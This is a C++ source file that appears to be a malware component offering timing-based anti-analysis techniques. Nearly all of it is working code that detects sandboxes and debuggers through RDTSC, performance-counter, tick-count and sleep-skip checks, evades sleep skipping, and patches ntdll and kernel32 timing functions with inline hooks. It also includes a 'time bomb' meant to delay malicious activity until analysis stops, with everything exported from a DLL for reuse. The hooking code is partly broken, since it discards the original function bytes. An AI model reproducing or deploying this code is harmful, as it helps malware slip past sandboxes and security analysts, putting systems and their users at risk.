// TimingEvasion.cpp - Timing-based detection evasion techniques
#include <Windows.h>
#include <winternl.h>
#include <iostream>
#include <chrono>
#include <thread>
#include <random>
#include <vector>
#include <atomic>
#include <intrin.h>

#pragma comment(lib, "ntdll.lib")

// Function pointers for timing APIs
typedef NTSTATUS(NTAPI* pNtQueryPerformanceCounter)(PLARGE_INTEGER, PLARGE_INTEGER);
typedef NTSTATUS(NTAPI* pNtQuerySystemTime)(PLARGE_INTEGER);
typedef VOID(WINAPI* pGetSystemTimeAsFileTime)(LPFILETIME);

class TimingEvasion {
private:
    std::mt19937 m_rng;
    std::atomic<bool> m_timingHooksActive;
    std::atomic<int64_t> m_timeOffset;
    std::atomic<int64_t> m_performanceCounterOffset;

    // Original function pointers
    pNtQueryPerformanceCounter m_origNtQueryPerformanceCounter;
    pNtQuerySystemTime m_origNtQuerySystemTime;
    pGetSystemTimeAsFileTime m_origGetSystemTimeAsFileTime;

    // Timing thresholds
    const int64_t RDTSC_THRESHOLD = 1000000;  // Cycles
    const int64_t PERFORMANCE_THRESHOLD = 100000;  // Performance counter units
    const int64_t TIME_THRESHOLD = 10000000;  // 100ns units (1 second)

public:
    TimingEvasion() : m_rng(std::random_device{}()),
                      m_timingHooksActive(false),
                      m_timeOffset(0),
                      m_performanceCounterOffset(0) {
        std::cout << "[TimingEvasion] Timing evasion initialized" << std::endl;
        InitializeOriginalFunctions();
    }

    // Detect timing-based analysis
    bool DetectTimingAnalysis() {
        std::cout << "[TimingEvasion] Checking for timing analysis..." << std::endl;

        bool detected = false;

        // Check RDTSC timing
        if (DetectRDTSCTiming()) {
            std::cout << "  [!] RDTSC timing detected" << std::endl;
            detected = true;
        }

        // Check performance counter timing
        if (DetectPerformanceCounterTiming()) {
            std::cout << "  [!] Performance counter timing detected" << std::endl;
            detected = true;
        }

        // Check GetTickCount timing
        if (DetectGetTickCountTiming()) {
            std::cout << "  [!] GetTickCount timing detected" << std::endl;
            detected = true;
        }

        // Check sleep timing accuracy
        if (DetectSleepTiming()) {
            std::cout << "  [!] Sleep timing anomaly detected" << std::endl;
            detected = true;
        }

        return detected;
    }

    // Install timing hooks to normalize execution time
    bool InstallTimingHooks() {
        if (m_timingHooksActive) return true;

        std::cout << "[TimingEvasion] Installing timing hooks..." << std::endl;

        // Hook NtQueryPerformanceCounter
        if (!HookTimingFunction("ntdll.dll", "NtQueryPerformanceCounter",
                               (PVOID)HookedNtQueryPerformanceCounter,
                               (PVOID*)&m_origNtQueryPerformanceCounter)) {
            return false;
        }

        // Hook NtQuerySystemTime
        if (!HookTimingFunction("ntdll.dll", "NtQuerySystemTime",
                               (PVOID)HookedNtQuerySystemTime,
                               (PVOID*)&m_origNtQuerySystemTime)) {
            return false;
        }

        // Hook kernel32 timing functions
        if (!HookTimingFunction("kernel32.dll", "GetSystemTimeAsFileTime",
                               (PVOID)HookedGetSystemTimeAsFileTime,
                               (PVOID*)&m_origGetSystemTimeAsFileTime)) {
            return false;
        }

        m_timingHooksActive = true;
        return true;
    }

    // Introduce random delays to evade timing analysis
    void RandomDelay(int minMs = 0, int maxMs = 100) {
        if (maxMs <= minMs) return;

        std::uniform_int_distribution<> dist(minMs, maxMs);
        int delayMs = dist(m_rng);

        // Use multiple methods to create delay
        int method = m_rng() % 3;
        switch (method) {
        case 0:
            std::this_thread::sleep_for(std::chrono::milliseconds(delayMs));
            break;
        case 1:
            Sleep(delayMs);
            break;
        case 2:
            BusyWait(delayMs);
            break;
        }
    }

    // Normalize execution time to avoid detection
    void NormalizeExecutionTime(int targetMs) {
        auto startTime = std::chrono::high_resolution_clock::now();

        // Yield to allow other operations
        std::this_thread::yield();

        auto elapsed = std::chrono::high_resolution_clock::now() - startTime;
        auto elapsedMs = std::chrono::duration_cast<std::chrono::milliseconds>(elapsed).count();

        if (elapsedMs < targetMs) {
            RandomDelay(targetMs - elapsedMs - 10, targetMs - elapsedMs);
        }
    }

    // RDTSC manipulation
    uint64_t GetManipulatedRDTSC() {
        uint64_t tsc = __rdtsc();

        // Add jitter to RDTSC values
        if (m_timingHooksActive) {
            int64_t jitter = (m_rng() % 10000) - 5000;
            tsc += jitter;
        }

        return tsc;
    }

    // Check for accelerated execution (VM/sandbox indicator)
    bool DetectAcceleratedExecution() {
        const int ITERATIONS = 5;
        const int EXPECTED_MIN_MS = 90;  // Expect at least 90ms for 100ms sleep

        for (int i = 0; i < ITERATIONS; i++) {
            auto start = std::chrono::high_resolution_clock::now();
            Sleep(100);
            auto end = std::chrono::high_resolution_clock::now();

            auto elapsed = std::chrono::duration_cast<std::chrono::milliseconds>(end - start).count();

            if (elapsed < EXPECTED_MIN_MS) {
                return true;  // Accelerated execution detected
            }
        }

        return false;
    }

    // Evade sleep skipping in sandboxes
    void SleepEvade(int milliseconds) {
        // Mix different sleep methods
        int method = m_rng() % 4;

        switch (method) {
        case 0:
            // Standard sleep with verification
            {
                auto start = GetTickCount64();
                Sleep(milliseconds);
                auto elapsed = GetTickCount64() - start;
                if (elapsed < milliseconds * 0.8) {
                    // Sleep was skipped, use alternative
                    BusyWait(milliseconds);
                }
            }
            break;

        case 1:
            // NtDelayExecution
            {
                LARGE_INTEGER delay;
                delay.QuadPart = -10000LL * milliseconds;  // Negative = relative time
                typedef NTSTATUS(NTAPI* pNtDelayExecution)(BOOLEAN, PLARGE_INTEGER);
                pNtDelayExecution NtDelayExecution = (pNtDelayExecution)GetProcAddress(
                    GetModuleHandleW(L"ntdll.dll"), "NtDelayExecution");
                if (NtDelayExecution) {
                    NtDelayExecution(FALSE, &delay);
                }
            }
            break;

        case 2:
            // WaitForSingleObject with event
            {
                HANDLE hEvent = CreateEventW(nullptr, TRUE, FALSE, nullptr);
                if (hEvent) {
                    WaitForSingleObject(hEvent, milliseconds);
                    CloseHandle(hEvent);
                }
            }
            break;

        case 3:
            // Busy wait with yield
            {
                auto end = std::chrono::steady_clock::now() + std::chrono::milliseconds(milliseconds);
                while (std::chrono::steady_clock::now() < end) {
                    std::this_thread::yield();
                }
            }
            break;
        }
    }

    // Time bomb - delay malicious activity
    void TimeBomb(int delaySeconds) {
        std::cout << "[TimingEvasion] Time bomb set for " << delaySeconds << " seconds" << std::endl;

        auto startTime = std::chrono::steady_clock::now();
        auto targetTime = startTime + std::chrono::seconds(delaySeconds);

        while (std::chrono::steady_clock::now() < targetTime) {
            // Perform benign activities
            PerformBenignActivity();

            // Random sleep between checks
            RandomDelay(100, 1000);

            // Check for analysis
            if (DetectTimingAnalysis()) {
                // Extend delay if analysis detected
                targetTime += std::chrono::seconds(30);
            }
        }

        std::cout << "[TimingEvasion] Time bomb expired" << std::endl;
    }

private:
    void InitializeOriginalFunctions() {
        HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
        HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");

        if (hNtdll) {
            m_origNtQueryPerformanceCounter = (pNtQueryPerformanceCounter)
                GetProcAddress(hNtdll, "NtQueryPerformanceCounter");
            m_origNtQuerySystemTime = (pNtQuerySystemTime)
                GetProcAddress(hNtdll, "NtQuerySystemTime");
        }

        if (hKernel32) {
            m_origGetSystemTimeAsFileTime = (pGetSystemTimeAsFileTime)
                GetProcAddress(hKernel32, "GetSystemTimeAsFileTime");
        }
    }

    bool DetectRDTSCTiming() {
        // Check for RDTSC timing analysis
        uint64_t start = __rdtsc();

        // Perform simple operation
        volatile int x = 0;
        for (int i = 0; i < 100; i++) {
            x += i;
        }

        uint64_t end = __rdtsc();
        uint64_t delta = end - start;

        // Check if timing is suspiciously consistent (VM/emulator)
        uint64_t start2 = __rdtsc();
        for (int i = 0; i < 100; i++) {
            x += i;
        }
        uint64_t end2 = __rdtsc();
        uint64_t delta2 = end2 - start2;

        // If deltas are too similar, might be emulated
        int64_t difference = abs((int64_t)(delta - delta2));
        return difference < 100;  // Too consistent
    }

    bool DetectPerformanceCounterTiming() {
        if (!m_origNtQueryPerformanceCounter) return false;

        LARGE_INTEGER freq, start, end;
        QueryPerformanceFrequency(&freq);

        QueryPerformanceCounter(&start);
        Sleep(10);
        QueryPerformanceCounter(&end);

        int64_t elapsed = end.QuadPart - start.QuadPart;
        int64_t expectedMin = (freq.QuadPart * 8) / 1000;  // 8ms minimum

        return elapsed < expectedMin;
    }

    bool DetectGetTickCountTiming() {
        DWORD start = GetTickCount();
        Sleep(100);
        DWORD end = GetTickCount();

        DWORD elapsed = end - start;
        return elapsed < 80 || elapsed > 150;  // Outside expected range
    }

    bool DetectSleepTiming() {
        // Check if Sleep is being skipped or accelerated
        auto start = std::chrono::high_resolution_clock::now();
        Sleep(50);
        auto end = std::chrono::high_resolution_clock::now();

        auto elapsed = std::chrono::duration_cast<std::chrono::milliseconds>(end - start).count();
        return elapsed < 40;  // Sleep was likely skipped
    }

    void BusyWait(int milliseconds) {
        auto end = std::chrono::steady_clock::now() + std::chrono::milliseconds(milliseconds);
        while (std::chrono::steady_clock::now() < end) {
            // Busy wait with minimal CPU usage
            _mm_pause();
        }
    }

    void PerformBenignActivity() {
        // Simulate normal program behavior
        volatile int result = 0;
        for (int i = 0; i < 1000; i++) {
            result += i * 2;
            result /= (i + 1);
        }
    }

    bool HookTimingFunction(const char* module, const char* function, PVOID hook, PVOID* original) {
        HMODULE hModule = GetModuleHandleA(module);
        if (!hModule) return false;

        PVOID funcAddr = GetProcAddress(hModule, function);
        if (!funcAddr) return false;

        // Simple inline hook (production would use proper hooking library)
        DWORD oldProtect;
        if (!VirtualProtect(funcAddr, 16, PAGE_EXECUTE_READWRITE, &oldProtect)) {
            return false;
        }

        // Save original bytes
        *original = funcAddr;

        // Write JMP to hook
        BYTE jmp[14] = {
            0xFF, 0x25, 0x00, 0x00, 0x00, 0x00,  // JMP [RIP+0]
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00  // Address
        };
        *(PVOID*)&jmp[6] = hook;

        memcpy(funcAddr, jmp, sizeof(jmp));
        VirtualProtect(funcAddr, 16, oldProtect, &oldProtect);

        return true;
    }

    // Hook functions
    static NTSTATUS NTAPI HookedNtQueryPerformanceCounter(PLARGE_INTEGER PerformanceCounter,
                                                          PLARGE_INTEGER PerformanceFrequency) {
        // Add artificial delay/jitter
        static TimingEvasion* instance = nullptr;
        if (!instance) {
            instance = new TimingEvasion();
        }

        NTSTATUS status = instance->m_origNtQueryPerformanceCounter(PerformanceCounter, PerformanceFrequency);

        if (NT_SUCCESS(status) && PerformanceCounter) {
            // Add offset to hide timing analysis
            PerformanceCounter->QuadPart += instance->m_performanceCounterOffset;
        }

        return status;
    }

    static NTSTATUS NTAPI HookedNtQuerySystemTime(PLARGE_INTEGER SystemTime) {
        static TimingEvasion* instance = nullptr;
        if (!instance) {
            instance = new TimingEvasion();
        }

        NTSTATUS status = instance->m_origNtQuerySystemTime(SystemTime);

        if (NT_SUCCESS(status) && SystemTime) {
            // Add offset to system time
            SystemTime->QuadPart += instance->m_timeOffset;
        }

        return status;
    }

    static VOID WINAPI HookedGetSystemTimeAsFileTime(LPFILETIME lpSystemTimeAsFileTime) {
        static TimingEvasion* instance = nullptr;
        if (!instance) {
            instance = new TimingEvasion();
        }

        instance->m_origGetSystemTimeAsFileTime(lpSystemTimeAsFileTime);

        if (lpSystemTimeAsFileTime) {
            // Manipulate time
            LARGE_INTEGER li;
            li.LowPart = lpSystemTimeAsFileTime->dwLowDateTime;
            li.HighPart = lpSystemTimeAsFileTime->dwHighDateTime;
            li.QuadPart += instance->m_timeOffset;
            lpSystemTimeAsFileTime->dwLowDateTime = li.LowPart;
            lpSystemTimeAsFileTime->dwHighDateTime = li.HighPart;
        }
    }
};

// Export functions
extern "C" {
    __declspec(dllexport) void* CreateTimingEvasion() {
        return new TimingEvasion();
    }

    __declspec(dllexport) bool DetectTiming(void* instance) {
        if (TimingEvasion* evasion = (TimingEvasion*)instance) {
            return evasion->DetectTimingAnalysis();
        }
        return false;
    }

    __declspec(dllexport) void EvadeSleep(int milliseconds) {
        TimingEvasion evasion;
        evasion.SleepEvade(milliseconds);
    }

    __declspec(dllexport) void RandomDelay(int minMs, int maxMs) {
        TimingEvasion evasion;
        evasion.RandomDelay(minMs, maxMs);
    }

    __declspec(dllexport) void DestroyTimingEvasion(void* instance) {
        delete (TimingEvasion*)instance;
    }
}